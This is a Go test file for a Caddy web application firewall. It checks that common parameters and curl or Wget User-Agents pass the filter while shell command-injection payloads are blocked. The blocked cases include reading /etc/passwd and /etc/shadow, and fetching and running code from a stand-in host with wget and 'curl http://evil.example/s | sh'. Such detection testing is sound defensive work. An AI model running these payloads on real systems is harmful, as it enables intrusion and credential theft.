package caddywaf

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/caddyserver/caddy/v2/modules/caddyhttp"
	"github.com/phemmer/go-iptrie"
	"github.com/stretchr/testify/assert"
	"go.uber.org/zap"
)

// False-positive regression guard for the idor-attacks and rce-commands-expanded
// rules (rules-tuning). Benign requests using common parameter names and words
// must reach upstream; real command-injection must still be blocked.

func fpMiddleware(t *testing.T) *Middleware {
	t.Helper()
	logger := zap.NewNop()
	m := &Middleware{
		logger:                logger,
		blacklistLoader:       NewBlacklistLoader(logger),
		AnomalyThreshold:      5,
		ruleCache:             NewRuleCache(),
		ipBlacklist:           iptrie.NewTrie(),
		dnsBlacklist:          map[string]struct{}{},
		ruleHitsByPhase:       map[int]int64{},
		RuleFiles:             []string{"rules.json"},
		requestValueExtractor: NewRequestValueExtractor(logger, false, 0),
		provisionTime:         time.Now(),
		topIPsBlocked:         map[string]int64{},
		blockedByReason:       map[string]int64{},
		geoIPStats:            map[string]int64{},
	}
	if err := m.loadRules(m.RuleFiles); err != nil {
		t.Fatalf("loadRules: %v", err)
	}
	return m
}

var fpNext = caddyhttp.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) error {
	w.WriteHeader(http.StatusOK)
	return nil
})

func fpBlockedQuery(m *Middleware, onWire string) bool {
	req := httptest.NewRequest(http.MethodGet, "/r", nil)
	req.URL.RawQuery = onWire
	req.RequestURI = "/r?" + onWire
	req.RemoteAddr = "203.0.113.9:1234"
	rec := httptest.NewRecorder()
	_ = m.ServeHTTP(rec, req, fpNext)
	return rec.Code == http.StatusForbidden
}

func fpBlockedBody(m *Middleware, body string) bool {
	req := httptest.NewRequest(http.MethodPost, "/submit", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.RemoteAddr = "203.0.113.9:1234"
	rec := httptest.NewRecorder()
	_ = m.ServeHTTP(rec, req, fpNext)
	return rec.Code == http.StatusForbidden
}

func fpBlockedUA(m *Middleware, ua string) bool {
	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.Header.Set("User-Agent", ua)
	req.RemoteAddr = "203.0.113.9:1234"
	rec := httptest.NewRecorder()
	_ = m.ServeHTTP(rec, req, fpNext)
	return rec.Code == http.StatusForbidden
}

// TestNoFalsePositiveOnCommonParams pins that ordinary requests are not blocked.
// Before the rules-tuning fix, idor-attacks (score 7, ≥ threshold) matched any
// common param name and rce-commands-expanded (score 5) matched bare words like
// "id"/"cat"/"ls", so all of these were 403s.
func TestNoFalsePositiveOnCommonParams(t *testing.T) {
	m := fpMiddleware(t)

	benignQueries := []string{
		"id=12345",
		"user=alice",
		"file=reports/2026/q3.pdf",
		"report=annual",
		"download=invoice.pdf",
		"category=books",
		"cat=animals",
		"ls=grid",
		"order=asc",
		"page=2&id=99",
	}
	for _, q := range benignQueries {
		t.Run("query "+q, func(t *testing.T) {
			assert.Falsef(t, fpBlockedQuery(m, q), "benign query %q must not be blocked", q)
		})
	}

	benignBodies := []string{
		"user=alice&id=42",
		"file=quarterly-report.xlsx",
		"comment=please echo my order back to me",
	}
	for _, b := range benignBodies {
		t.Run("body "+b, func(t *testing.T) {
			assert.Falsef(t, fpBlockedBody(m, b), "benign body %q must not be blocked", b)
		})
	}

	// Legitimate clients whose User-Agent contains a command-like token.
	for _, ua := range []string{"curl/7.88.1", "Wget/1.21.3", "MyApp/1.0 (python-requests/2.31)"} {
		t.Run("ua "+ua, func(t *testing.T) {
			assert.Falsef(t, fpBlockedUA(m, ua), "benign User-Agent %q must not be blocked", ua)
		})
	}
}

// TestRealCommandInjectionStillBlocked pins that tightening rce-commands-expanded
// did not lose detection: shell-injection payloads must still be blocked.
func TestRealCommandInjectionStillBlocked(t *testing.T) {
	m := fpMiddleware(t)
	attacks := []string{
		"q=;cat /etc/passwd",
		"q=|cat /etc/shadow",
		"q=`id`",
		"q=$(id)",
		"q=; wget http://evil.example/x -O /tmp/x",
		"q=&& curl http://evil.example/s | sh",
		"input=`whoami`",
	}
	for _, a := range attacks {
		t.Run(a, func(t *testing.T) {
			// These payloads are set directly as the raw query bytes an attacker
			// sends. The WAF matches each rule against both the raw value and the
			// value after its default transform chain (URL-decode, null-strip,
			// whitespace-compress); since these bytes carry no percent-encoding,
			// the metacharacters and spaces reach the matcher intact.
			assert.Truef(t, fpBlockedQuery(m, a), "command injection %q must be blocked", a)
		})
	}
}
